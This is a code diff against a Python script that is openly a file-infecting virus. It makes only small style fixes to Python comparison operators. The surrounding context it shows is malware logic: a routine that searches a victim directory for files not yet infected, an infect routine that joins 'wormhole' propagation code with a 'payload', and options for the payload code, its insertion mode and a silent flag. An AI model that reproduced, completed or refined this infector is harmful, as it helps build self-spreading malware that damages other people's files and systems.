@@ -226,17 +226,17 @@ def search(path):
                     infected = True
                     break
             # [ NOTE ]: If file is not yet infected, add to return value
-            if infected == False:
+            if infected is False:
                 files_to_infect.append(path + "/" + file_name)
     return files_to_infect
 
 # INFECT
 
 def infect(files_to_infect):
-    if running_mode is 1:
+    if running_mode == 1:
         viral_infection = scanned_code['wormhole'] \
             + '\n' + scanned_code['payload']
-    elif running_mode is 0:
+    elif running_mode == 0:
         viral_infection = scanned_code['wormhole']
     else:
         stdout_msg("[ ! ]: Invalid running mode ({}).".format(running_mode))
@@ -268,7 +268,7 @@ def infect_files(viral_infection, files_to_infect):
 
 def process_code_insertion_mode_argument(parser, options):
     insertion_mode = options.insertion_mode
-    if insertion_mode == None:
+    if insertion_mode is None:
         stdout_msg(
             '[ ! ]: No payload code insertion mode found. '
             'Defaulting to ({}).'.format(code_insertion_mode)
@@ -279,7 +279,7 @@ def process_code_insertion_mode_argument(parser, options):
 
 def process_search_directory_argument(parser, options):
     search_dir = options.search_directory
-    if search_dir == None:
+    if search_dir is None:
         stdout_msg(
             '[ ! ]: No search directory path found. '
             'Defaulting to ({}).'.format(victim_directory)
@@ -292,7 +292,7 @@ def process_search_directory_argument(parser, options):
 def process_payload_code_argument(parser, options):
     global code_insertion_mode
     payload_code = options.payload_code
-    if payload_code == None:
+    if payload_code is None:
         stdout_msg(
             '[ ! ]: No payload code string found. '
             'Defaulting to ({}).'.format(scanned_code['payload'])
@@ -324,7 +324,7 @@ def process_command_line_options(parser):
 
 def process_payload_file_argument(parser, options):
     payload_file = options.payload_file
-    if payload_file == None:
+    if payload_file is None:
         stdout_msg(
             '[ ! ]: No payload file path found. '
             'Defaulting to ({}).'.format(scanner_file['payload'])
@@ -342,7 +342,7 @@ def process_payload_file_argument(parser, options):
 def process_silent_flag_argument(parser, options):
     global silent_flag
     flag = options.silent
-    if flag == None:
+    if flag is None:
         stdout_msg(
             '[ ! ]: No silent flag provided. '
             'Defaulting to ({}).'.format(silent_flag)
@@ -357,7 +357,7 @@ def process_silent_flag_argument(parser, options):
 # GENERAL
 
 def payload():
-    if running_mode is 0:
+    if running_mode == 0:
         return str()
     stdout_msg(
         '[ X ]: Executing payload code: \n{}'.format(scanned_code['payload'])
